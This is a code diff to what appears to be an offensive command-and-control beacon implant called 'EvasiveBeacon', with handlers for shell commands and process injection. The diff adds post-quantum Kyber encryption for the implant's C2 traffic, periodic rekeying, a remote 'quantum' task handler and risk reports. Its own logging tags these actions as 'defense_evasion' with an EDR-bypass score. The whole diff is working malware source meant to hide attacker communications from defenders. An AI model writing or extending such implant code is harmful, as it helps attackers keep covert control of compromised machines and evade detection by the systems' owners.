@@ -184,6 +184,32 @@ except ImportError:
     DefenseAnalysis = None
     print("[!] Behavioral mimicry not available")
 
+# NEW: Import quantum-resistant cryptography
+try:
+    from cybermodules.quantum_crypto import (
+        C2QuantumEncryption,
+        KyberKEM,
+        HybridPQCrypto,
+        QuantumRiskAnalyzer,
+        PQAlgorithm,
+        EncryptionMode,
+        QuantumThreatLevel,
+        create_quantum_crypto,
+        analyze_quantum_risk,
+        generate_kyber_keypair,
+        get_quantum_risk_report,
+        QUANTUM_CRYPTO_AVAILABLE as _QC_AVAILABLE,
+    )
+    QUANTUM_CRYPTO_AVAILABLE = _QC_AVAILABLE
+except ImportError:
+    QUANTUM_CRYPTO_AVAILABLE = False
+    C2QuantumEncryption = None
+    KyberKEM = None
+    QuantumRiskAnalyzer = None
+    PQAlgorithm = None
+    EncryptionMode = None
+    print("[!] Quantum cryptography not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -251,6 +277,13 @@ class BeaconConfig:
     mimicry_activity_variance: float = 0.3
     mimicry_break_frequency: int = 45  # minutes
     mimicry_work_hours: tuple = (9, 17)
+    # NEW: Quantum-resistant cryptography settings (ENDGAME)
+    enable_quantum_crypto: bool = True
+    quantum_mode: str = "hybrid"  # classical, pq, hybrid, auto
+    quantum_algorithm: str = "kyber768"  # kyber512, kyber768, kyber1024
+    quantum_auto_upgrade: bool = True  # Auto-upgrade based on threat level
+    quantum_rekey_interval: int = 3600  # Re-key every N seconds
+    quantum_risk_analysis: bool = True  # Include quantum risk in reports
 
 
 @dataclass
@@ -328,6 +361,13 @@ class EvasiveBeacon:
         if BEHAVIORAL_MIMICRY_AVAILABLE and config.enable_behavioral_mimicry:
             self._init_behavioral_mimicry()
         
+        # NEW: Initialize quantum-resistant cryptography (ENDGAME)
+        self.quantum_crypto = None
+        self._quantum_public_key = None
+        self._quantum_last_rekey = 0
+        if QUANTUM_CRYPTO_AVAILABLE and config.enable_quantum_crypto:
+            self._init_quantum_crypto()
+        
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
             "cmd": self._handle_cmd,
@@ -342,6 +382,7 @@ class EvasiveBeacon:
             "inject": self._handle_inject,  # NEW
             "report": self._handle_report,  # NEW: Report generation handler
             "mimicry": self._handle_mimicry,  # NEW: Behavioral mimicry handler
+            "quantum": self._handle_quantum,  # NEW: Quantum crypto handler
             "exit": self._handle_exit,
         }
         
@@ -672,6 +713,41 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize behavioral mimicry: {e}")
             self.mimicry_engine = None
+    
+    def _init_quantum_crypto(self):
+        """Initialize quantum-resistant cryptography (ENDGAME)"""
+        if not QUANTUM_CRYPTO_AVAILABLE:
+            return
+        
+        try:
+            # Create quantum crypto engine
+            self.quantum_crypto = create_quantum_crypto(
+                mode=self.config.quantum_mode,
+                algorithm=self.config.quantum_algorithm
+            )
+            
+            # Initialize keys
+            self._quantum_public_key = self.quantum_crypto.initialize_keys()
+            self._quantum_last_rekey = time.time()
+            
+            print(f"[+] 🔮 Quantum-resistant cryptography initialized:")
+            print(f"    Mode: {self.config.quantum_mode}")
+            print(f"    Algorithm: {self.config.quantum_algorithm.upper()}")
+            print(f"    Auto-upgrade: {self.config.quantum_auto_upgrade}")
+            print(f"    Rekey interval: {self.config.quantum_rekey_interval}s")
+            
+            # Quantum risk analysis if enabled
+            if self.config.quantum_risk_analysis:
+                current_algos = ['RSA-2048', 'AES-256', f'Kyber-{self.config.quantum_algorithm[-3:]}']
+                risk_report = analyze_quantum_risk(current_algos)
+                print(f"    Threat level: {risk_report.threat_level.value.upper()}")
+                print(f"    Risk score: {risk_report.risk_score:.1%}")
+                print(f"    PQ readiness: {risk_report.pq_readiness_score:.1%}")
+                print(f"    Harvest-now risk: {'⚠️ YES' if risk_report.harvest_now_risk else '✅ NO'}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize quantum crypto: {e}")
+            self.quantum_crypto = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -1745,6 +1821,167 @@ class EvasiveBeacon:
         if self.mimicry_engine and self.config.enable_behavioral_mimicry:
             return self.mimicry_engine.wrap_action(action, *args, **kwargs)
         return action(*args, **kwargs)
+    
+    def _handle_quantum(self, task: Dict) -> Dict:
+        """
+        Control quantum-resistant cryptography.
+        
+        Task params:
+            action: init, rekey, status, risk_report, encrypt, decrypt, set_mode
+            mode: Encryption mode (if action=set_mode)
+            data: Data to encrypt/decrypt (base64 encoded)
+        """
+        result = {
+            "success": False,
+            "action": "",
+            "mode": "",
+            "algorithm": "",
+            "error": None,
+        }
+        
+        if not QUANTUM_CRYPTO_AVAILABLE:
+            result["error"] = "Quantum cryptography not available"
+            return result
+        
+        try:
+            params = task.get("params", {})
+            action = params.get("action", "status")
+            
+            if action == "init":
+                # Initialize or reinitialize quantum crypto
+                self._init_quantum_crypto()
+                if self.quantum_crypto:
+                    result["success"] = True
+                    result["action"] = "initialized"
+                    result["mode"] = self.config.quantum_mode
+                    result["algorithm"] = self.config.quantum_algorithm
+                else:
+                    result["error"] = "Failed to initialize quantum crypto"
+                    
+            elif action == "rekey":
+                # Re-key the quantum session
+                if self.quantum_crypto:
+                    self._quantum_public_key = self.quantum_crypto.initialize_keys()
+                    self._quantum_last_rekey = time.time()
+                    result["success"] = True
+                    result["action"] = "rekeyed"
+                    result["mode"] = self.config.quantum_mode
+                else:
+                    result["error"] = "Quantum crypto not initialized"
+                    
+            elif action == "status":
+                if self.quantum_crypto:
+                    stats = self.quantum_crypto.get_stats()
+                    result["success"] = True
+                    result["action"] = "status"
+                    result["mode"] = stats["mode"]
+                    result["algorithm"] = stats["algorithm"]
+                    result["messages_encrypted"] = stats["messages_encrypted"]
+                    result["messages_decrypted"] = stats["messages_decrypted"]
+                    result["key_exchanges"] = stats["key_exchanges"]
+                    result["has_session_key"] = stats["has_session_key"]
+                    result["time_since_rekey"] = int(time.time() - self._quantum_last_rekey)
+                else:
+                    result["error"] = "Quantum crypto not initialized"
+                    
+            elif action == "risk_report":
+                # Generate quantum risk analysis report
+                analyzer = QuantumRiskAnalyzer()
+                current_algos = params.get("algorithms", 
+                    ['RSA-2048', 'ECDSA-256', 'AES-256', f'Kyber-{self.config.quantum_algorithm[-3:]}'])
+                report = analyzer.analyze_algorithms(current_algos)
+                
+                result["success"] = True
+                result["action"] = "risk_report"
+                result["risk_report"] = report.to_dict()
+                result["ai_report"] = analyzer.generate_ai_report(current_algos)
+                
+            elif action == "encrypt":
+                # Encrypt data with quantum crypto
+                if self.quantum_crypto:
+                    data = base64.b64decode(params.get("data", ""))
+                    encrypted = self.quantum_crypto.encrypt_message(data)
+                    result["success"] = True
+                    result["action"] = "encrypted"
+                    result["encrypted_data"] = base64.b64encode(encrypted).decode()
+                    result["original_size"] = len(data)
+                    result["encrypted_size"] = len(encrypted)
+                else:
+                    result["error"] = "Quantum crypto not initialized"
+                    
+            elif action == "decrypt":
+                # Decrypt data with quantum crypto
+                if self.quantum_crypto:
+                    data = base64.b64decode(params.get("data", ""))
+                    decrypted = self.quantum_crypto.decrypt_message(data)
+                    result["success"] = True
+                    result["action"] = "decrypted"
+                    result["decrypted_data"] = base64.b64encode(decrypted).decode()
+                else:
+                    result["error"] = "Quantum crypto not initialized"
+                    
+            elif action == "set_mode":
+                # Change encryption mode
+                new_mode = params.get("mode", "hybrid")
+                mode_map = {
+                    'classical': EncryptionMode.CLASSICAL_ONLY,
+                    'pq': EncryptionMode.PQ_ONLY,
+                    'hybrid': EncryptionMode.HYBRID,
+                    'auto': EncryptionMode.AUTO,
+                }
+                if new_mode in mode_map:
+                    self.quantum_crypto = create_quantum_crypto(
+                        mode=new_mode,
+                        algorithm=self.config.quantum_algorithm
+                    )
+                    self._quantum_public_key = self.quantum_crypto.initialize_keys()
+                    self._quantum_last_rekey = time.time()
+                    result["success"] = True
+                    result["action"] = "mode_changed"
+                    result["mode"] = new_mode
+                else:
+                    result["error"] = f"Invalid mode: {new_mode}"
+                    
+            elif action == "timeline":
+                # Get quantum computer development timeline
+                analyzer = QuantumRiskAnalyzer()
+                timeline = analyzer.get_quantum_timeline()
+                result["success"] = True
+                result["action"] = "timeline"
+                result["timeline"] = timeline
+                
+            else:
+                result["error"] = f"Unknown action: {action}"
+            
+            # Log quantum crypto action
+            self._log_chain_entry(
+                technique="quantum_crypto",
+                tactic="defense_evasion",
+                success=result["success"],
+                edr_bypass=1.0 if result["success"] else 0.0,
+                details={"action": action, "mode": result.get("mode", "")},
+            )
+            
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    def _quantum_encrypt_c2(self, data: bytes) -> bytes:
+        """Encrypt C2 traffic with quantum-resistant encryption"""
+        if self.quantum_crypto and self.config.enable_quantum_crypto:
+            # Auto rekey if needed
+            if time.time() - self._quantum_last_rekey > self.config.quantum_rekey_interval:
+                self._quantum_public_key = self.quantum_crypto.initialize_keys()
+                self._quantum_last_rekey = time.time()
+            return self.quantum_crypto.encrypt_message(data)
+        return data
+    
+    def _quantum_decrypt_c2(self, data: bytes) -> bytes:
+        """Decrypt C2 traffic with quantum-resistant encryption"""
+        if self.quantum_crypto and self.config.enable_quantum_crypto:
+            return self.quantum_crypto.decrypt_message(data)
+        return data
     
     def _handle_exit(self, task: Dict) -> str:
         """Stop beacon and optionally generate report"""
